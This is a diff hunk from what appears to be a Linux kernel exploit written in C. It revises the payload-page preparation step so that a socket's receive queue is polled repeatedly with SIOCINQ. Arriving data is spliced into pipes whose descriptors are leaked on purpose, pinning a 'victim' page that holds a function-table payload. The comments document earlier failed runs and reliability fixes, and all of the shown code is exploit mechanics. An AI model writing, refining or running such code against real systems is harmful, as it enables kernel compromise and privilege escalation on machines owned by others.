@@ -4160,10 +4160,26 @@ uintptr_t prepare_kernel_page(int payload_mode) {
      * F_SETPIPE_SZ (pipe-user-pages-soft is exhausted by the drain
      * pipes; resize would EPERM).  */
     if (payload_mode == PAGE_PAYLOAD_FOPS && hit_c >= 0 && hit_c < nconn) {
-      int pin_q = -1;
-      if (ioctl(keep_srv[hit_c], SIOCINQ, &pin_q) == 0 && pin_q > 0) {
-        int remain = pin_q;
-        int npipe = 0;
+      int npipe = 0, pin_bytes = 0, rounds = 0;
+      /* fix69b: the hit send can lag in the sender's write queue (cwnd
+       * tail) -- redo4's snapshot showed q=111*32768 while the hit was
+       * send i=111, so a single splice pinned every page BUT the victim,
+       * which then arrived, got consumed by route, went bare and was
+       * zeroed before cfi (ENOTTY on the dead ioctl slot).  Loop: splice
+       * whatever has arrived, wait for late ACKs, repeat until the queue
+       * is stably empty (>=2 consecutive empty reads, 5 rounds max, all
+       * well inside the seconds before route starts). */
+      int empty_streak = 0;
+      while (rounds < 5 && npipe < 64 && empty_streak < 2) {
+        int q = -1;
+        if (ioctl(keep_srv[hit_c], SIOCINQ, &q) != 0 || q <= 0) {
+          empty_streak++;
+          usleep(200000);
+          rounds++;
+          continue;
+        }
+        empty_streak = 0;
+        int remain = q;
         while (remain > 0 && npipe < 64) {
           int hp[2] = {-1, -1};
           if (pipe(hp) != 0) {
@@ -4176,15 +4192,16 @@ uintptr_t prepare_kernel_page(int payload_mode) {
                               SPLICE_F_NONBLOCK);
           if (sp <= 0) break;
           npipe++;
+          pin_bytes += (int)sp;
           remain -= (int)sp;
           if ((size_t)sp < chunk) break;
         }
-        pr_info("payload pin splice conn=%d q=%d pipes=%d remain=%d\n",
-                hit_c, pin_q, npipe, remain);
-        /* Pipe fds leak on purpose: closing them releases the pages. */
-      } else {
-        pr_warning("payload pin SIOCINQ q=%d errno=%d\n", pin_q, errno);
+        rounds++;
+        usleep(200000);
       }
+      pr_info("payload pin splice conn=%d bytes=%d pipes=%d rounds=%d\n",
+              hit_c, pin_bytes, npipe, rounds);
+      /* Pipe fds leak on purpose: closing them releases the pages. */
     }
   }
   {
